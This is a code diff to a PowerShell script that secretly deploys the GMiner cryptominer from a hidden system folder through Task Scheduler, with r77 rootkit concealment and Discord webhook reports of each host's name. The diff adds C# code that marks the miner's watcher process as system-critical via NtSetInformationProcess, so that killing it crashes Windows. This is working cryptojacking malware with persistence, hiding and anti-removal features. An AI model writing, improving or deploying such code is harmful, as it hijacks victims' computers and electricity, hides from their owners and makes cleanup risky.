@@ -2,7 +2,8 @@
 <#
 .SYNOPSIS
     Deploys and runs GMiner from a hidden system folder using Task Scheduler.
-    Includes Safe Update and r77 Rootkit. (NO Critical Process)
+    Includes Safe Update, Critical Process (with Safe Shutdown), and r77 Rootkit.
+    NOTE: This version DOES NOT include the -Uninstall switch.
 .EXAMPLE
     .\Mine.ps1 -Wallet "YOUR_WALLET_ADDRESS" -Pool "us-rvn.2miners.com:6060" -Algo "kawpow" -DiscordWebhook "https://discord.com/api/webhooks/..."
 #>
@@ -34,6 +35,50 @@ $scriptPath = $PSCommandPath
 if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Path }
 
 # ---------- helpers ---------------------------------------------------------
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+
+public static class ProcessProtector {
+    [DllImport("ntdll.dll")]
+    public static extern int NtSetInformationProcess(IntPtr hProcess, int infoClass, ref int info, int infoLength);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool SetConsoleCtrlHandler(CtrlHandler handler, bool add);
+
+    delegate bool CtrlHandler(int ctrlType);
+    static CtrlHandler _handler;
+
+    static IntPtr _hProcess = IntPtr.Zero;
+    static int _isCritical = 1;
+    const int ProcessBreakOnTermination = 0x1D;
+
+    public static void SetCriticalForPid(int pid, bool critical) {
+        _isCritical = critical ? 1 : 0;
+        try {
+            IntPtr hProcess = System.Diagnostics.Process.GetProcessById(pid).Handle;
+            NtSetInformationProcess(hProcess, ProcessBreakOnTermination, ref _isCritical, 4);
+        } catch {}
+    }
+
+    public static void RegisterShutdownHandler() {
+        _hProcess = System.Diagnostics.Process.GetCurrentProcess().Handle;
+        _handler = new CtrlHandler(HandleCtrl);
+        SetConsoleCtrlHandler(_handler, true);
+    }
+
+    static bool HandleCtrl(int ctrlType) {
+        if (ctrlType == 2 || ctrlType == 5 || ctrlType == 6) {
+            _isCritical = 0;
+            if (_hProcess != IntPtr.Zero) {
+                NtSetInformationProcess(_hProcess, ProcessBreakOnTermination, ref _isCritical, 4);
+            }
+        }
+        return false;
+    }
+}
+"@
+
 function Send-DiscordWebhook {
     param([string]$WebhookUrl, [string]$Title, [string]$Message, [int]$Color = 3066993)
     if ([string]::IsNullOrWhiteSpace($WebhookUrl)) { return $false }
@@ -52,6 +97,7 @@ function Stop-Safe {
     $watchers = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
         Where-Object { $_.CommandLine -like '*WinCache.ps1*' }
     foreach ($w in $watchers) {
+        [ProcessProtector]::SetCriticalForPid($w.ProcessId, $false)
         Stop-Process -Id $w.ProcessId -Force -ErrorAction SilentlyContinue
     }
     Start-Sleep -Seconds 1
@@ -121,7 +167,9 @@ if ($Run) {
         Add-Content -Path $LogFile -Value "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [$Level] $Msg" -Encoding UTF8
     }
 
-    Write-Session "Watcher iniciado (PID $PID)."
+    [ProcessProtector]::SetCriticalForPid($PID, $true)
+    [ProcessProtector]::RegisterShutdownHandler()
+    Write-Session "Watcher iniciado (PID $PID) - Crítico con Safe-Shutdown."
 
     # --- ROOTKIT ---
     try {
@@ -158,7 +206,7 @@ if ($Run) {
             } catch {}
 
             if (-not $notifiedStart -and $DiscordWebhook) {
-                $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`n*(Rootkit Activado)*"
+                $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`n*(Protecciones Activadas)*"
                 Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "✅ Minero Iniciado" -Message $msg -Color 3066993 | Out-Null
                 $notifiedStart = $true
             }
